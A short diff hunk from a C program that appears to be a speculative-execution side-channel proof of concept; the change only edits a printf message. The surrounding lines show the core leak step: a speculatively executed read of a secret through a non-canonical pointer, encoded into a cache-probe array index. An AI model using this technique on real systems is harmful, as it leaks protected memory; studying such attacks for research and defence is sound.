@@ -63,7 +63,7 @@ void speculative(char *secret_ptr) {
     gadget(); //modify the Software stack
     secret = *non_canonical; //Speculative return here
     temp = *(Array + (secret << 12));
-    printf("Holy Hell");
+    printf("Shouldn't be visible\n");
 }
 
 unsigned char check_chache_hit() {
